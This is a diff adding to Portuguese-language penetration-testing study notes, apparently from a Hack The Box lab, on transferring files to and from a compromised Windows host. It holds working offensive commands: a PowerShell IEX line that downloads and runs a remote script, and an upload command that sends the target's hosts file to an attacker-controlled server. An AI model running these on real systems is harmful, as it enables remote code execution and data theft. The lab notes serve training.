@@ -143,3 +143,47 @@ C:\htb> copy n:\nc.exe
 ```
 Gust4vo@htb[/htb]$ sudo pip3 install pyftpdlib
 ```
+- Configure
+```
+Gust4vo@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
+
+[I 2022-05-17 10:09:19] concurrency model: async
+[I 2022-05-17 10:09:19] masquerade (NAT) address: None
+[I 2022-05-17 10:09:19] passive ports: None
+[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
+```
+Depois que o servidor FTP é configurado, podemos executar transferências de arquivos usando o cliente FTP pré-instalado do Windows ou do PowerShell Net.WebClient.
+
+```
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+### PowerShell Web Uploads
+
+Na maquina do atacante
+
+```
+Gust4vo@htb[/htb]$ pip3 install uploadserver
+
+Collecting upload server
+  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+Installing collected packages: uploadserver
+Successfully installed uploadserver-2.0.1
+```
+
+```
+Gust4vo@htb[/htb]$ python3 -m uploadserver
+
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Na maquina do alvo
+
+```
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
+[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
+```
